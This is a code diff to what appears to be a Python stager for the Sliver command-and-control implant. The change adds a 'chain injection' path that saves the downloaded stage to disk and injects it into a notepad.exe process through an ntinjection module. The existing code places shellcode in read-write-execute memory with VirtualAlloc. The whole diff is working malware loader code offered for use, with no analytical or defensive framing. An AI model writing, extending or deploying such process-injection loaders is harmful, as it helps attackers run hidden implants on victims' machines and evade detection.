@@ -32,6 +32,7 @@ class stage():
     payload_size = 0
     #sbuffer = bytearray
     header_16bytes = ''
+    chain_injection = True
     requests.packages.urllib3.disable_warnings() 
     #aes_key = b'ccuxGzZkf6NoThrhxq8NFPVhnE3Nlbun'
     #aes_iv = b'liowuFwnLZeW4zIN'
@@ -39,6 +40,8 @@ class stage():
 
     #import base64
     import gzip
+    if chain_injection:
+         import modules.ntinjection
 
     def msg(self, message_type, ErrorExit=False):
         messages = {
@@ -131,6 +134,15 @@ class stage():
         stage_buffer = stage_data
         #self.sbuffer = stage_buffer[0:8]
         self.msg('proc.buf')
+
+        if self.chain_injection:
+             with open('sliver.stage', 'wb') as file:
+                  file.write(stage_buffer)
+             print('Injection chained...')
+             cj = self.modules.ntinjection.inject('', True, 'notepad.exe', stage_buffer, False, False)
+             cj.start_injection()
+             exit()
+
         ptr = VirtualAlloc(0, len(stage_buffer), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
         if ptr:
              self.msg('inj.alloc')
